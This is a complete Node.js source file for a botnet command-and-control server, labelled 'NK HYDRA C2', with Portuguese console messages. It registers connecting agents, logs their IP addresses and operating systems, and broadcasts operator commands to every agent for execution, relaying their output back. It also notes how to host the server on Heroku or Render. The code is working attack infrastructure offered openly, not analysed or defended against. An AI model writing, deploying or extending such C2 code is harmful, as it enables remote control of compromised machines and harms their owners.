/* NK HYDRA C2 SERVER v41.0 */
/* SINGULARITY HIVE PROTOCOL */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => res.send('NK WARLORD C2 v41 - ONLINE'));

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 60000, 
    pingInterval: 25000,
    transports: ['websocket', 'polling'] 
}); 

console.log("[*] SERVIDOR INICIADO. AGUARDANDO EXERCITO...");

io.on('connection', (socket) => {
    console.log(`[+] NOVA CONEXAO: ${socket.id}`);
    
    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentId = data.id || socket.id;
            console.log(`[AGENT CONNECTED] ${agentId}`);
            
            io.emit('status', { 
                agents: [{ 
                    id: agentId, 
                    ip: socket.handshake.address.replace('::ffff:', ''), 
                    os: data.os || 'UNKNOWN', 
                    status: 'ONLINE' 
                }] 
            });
            
            io.emit('log', `[SYSTEM] AGENT LINKED: ${agentId}`);
        }
    });

    socket.on('cmd', (data) => {
        console.log(`[CMD] ${data.cmd} -> ${data.target}`);
        io.emit('exec', data); 
        io.emit('log', `[C2] ORDEM ENVIADA: ${data.cmd}`);
    });

    socket.on('stream_log', (data) => {
        // console.log(`[LOG] ${data.output}`);
        io.emit('log', data);
    });
});

// Porta padrão 3000. Se usar Render/Heroku, ele pega a var PORT automaticamente.
server.listen(process.env.PORT || 3000, () => {
    console.log(`[*] C2 RODANDO NA PORTA ${process.env.PORT || 3000}`);
});